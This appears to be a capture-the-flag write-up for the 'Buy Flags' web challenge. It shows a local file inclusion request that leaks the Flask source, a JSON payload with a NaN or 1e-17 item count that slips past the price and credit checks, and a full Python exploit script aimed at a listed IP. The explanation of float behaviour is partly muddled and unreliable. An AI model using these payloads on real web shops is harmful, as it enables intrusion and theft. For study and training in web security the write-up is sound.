# Buy Flags

This is a shopping page that client can buy flag, but client doesn't get enough money to buy it (1 or 10, I'm not sure.).

First, with url like: `http://46.101.173.61/image?name=asis.png`, we can leak the source code using LFI vulnerability.

From header's message leak, we guess it uses Flask framework, so let's request:
```
http://46.101.173.61/image?name=app.py
```

Then get the source back:
```python=
from flask import Flask, Response, render_template, session, request, jsonify

app = Flask(__name__)
app.secret_key = open('private/secret.txt').read()

flags = {
    'fake1': {
        'price': 125,
        'coupons': ['fL@__g'],
        'data': 'fake1{this_is_a_fake_flag}'
    },
    'fake2': {
        'price': 290,
        'coupons': ['fL@__g'],
        'data': 'fake2{this_is_a_fake_flag}'
    },
    'asis': {
        'price': 110,
        'coupons': [],
        'data': open('private/flag.txt').read()
    }
}

@app.route('/')
def main():
    if session.get('credit') == None:
        session['credit'] = 0
        session['coupons'] = []
    return render_template('index.html', credit = session['credit'])
    #return 'Hello World!<br>Your Credit is {}<br>Used Coupons is {}'.format(session.get('credit'), session.get('coupons'))

@app.route('/image')
def resouce():
    image_name = request.args.get('name')
    if '/' in image_name or '..' in image_name or 'private' in image_name:
        return 'Access Denied'
    return Response(open(image_name).read(), mimetype='image/png')

@app.route('/pay', methods=['POST'])
def pay():
    data = request.get_json()

    card = data['card']
    coupon = data['coupon']

    if coupon.replace('=','') in session.get('coupons'):
        return jsonify({'result': 'the coupon is already used'})

    for flag in card:
        if flag['count'] <= 0:
            return jsonify({'result':'item count must be greater than zero'})

    discount = 0
    for flag in card:
        if coupon.decode('base64').strip() in flags[flag['name']]['coupons']:
            discount += flag['count'] * flags[flag['name']]['price']

    credit = session.get('credit') + discount

    for flag in card:
        credit -= flag['count'] * flags[flag['name']]['price']
        
    if credit < 0:
        result = {'result': 'your credit not enough'}
    else:
        result = {'result': 'pay success'}
        result_data = []
        for flag in card:
            result_data.append({'flag': flag['name'], 'data': flags[flag['name']]['data']})
        result['data'] = result_data
        session['credit'] = credit
        session['coupons'].append(coupon.replace('=',''))
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

Cuz we have no price, we need coupon to make this purchase happen.

First, take a look 

```python
    for flag in card:
        if flag['count'] <= 0:
            return jsonify({'result':'item count must be greater than zero'})
    ...
    discount += flag['count'] * flags[flag['name']]['price']
    #not important here
    ...
    credit -= flag['count'] * flags[flag['name']]['price']
    #just make sure flag['count'] * flags[flag['name']]['price'] = 0
    #Then will make credit >= 0
    ...
    if credit < 0:
        result = {'result': 'your credit not enough'}
```

Chal try to make sure our coupon cannnot turn item price into zero.

Now, we need a payload that make `if flag['count'] <= 0` == false, and `flag['count'] * flags[flag['name']]['price']` == 0.

What can make this happen? `NaN` or more exactly: [`float-point issue`](https://docs.python.org/3/tutorial/floatingpoint.html).

```python
>>> json.loads('{"a": NaN}')['a']
nan
>>> type(json.loads('{"a": NaN}')['a']) #This is float-point issue
<type 'float'>
>>> json.loads('{"a": NaN}')['a'] <= 0 #bypass "if flag['count'] <= 0:"
False
>>> (1-json.loads('{"a":NaN}')['a'])<0 #bypass "if credit < 0:"
False
```

With this result, will can construct a payload to make `app.py/pay()` print the flag.

```JSON
{
    "card": [
        {
            "count": NaN,
            "name": "asis"
        }
    ],
    "coupon": ""
}
```

Here's final payload script from [hackability](https://ctftime.org/writeup/9913):
```python
import requests

url = "http://46.101.173.61/pay"

headers = {
    'Host': '46.101.173.61',
}

r = requests.get("http://46.101.173.61", headers=headers)

print r.content
print r.headers
print

headers['Cookie'] = r.headers['Set-Cookie']
headers['Content-Type'] = "application/json"
headers['X-Requested-With'] = "XMLHttpRequest"

# card sequence is matter of result
data = '''{"card":[{"name":"asis", "count":NaN}],"coupon":""}'''
#data = '''{"card":[{"name":"fake2", "count":1}],"coupon":"%s"}''' % ("fL@__g".encode("base64").strip())
r = requests.post(url, headers=headers, data=data)

print r.headers
print r.content
```

This is final answer:

```python
{"data": [{"data": "ASIS{th1@n_3xpens1ve_Fl@G}\n", "flag": "asis"}], "result": "pay success"}
```

Another way, float-point issue:

## Float-point Issue
Python turn float into int drop after 17 digits (`1e-17` or `0.00000000000000001`).
However, when they calculate multiplication, they support `1e-10` to `1e-32` float value.
That means `1e-17` can false both `if flag['1e-17'] <= 0:` and `if (1-110*1e-17) < 0:`.

Just change exploit script's `NaN` to `1e-17` in JSON.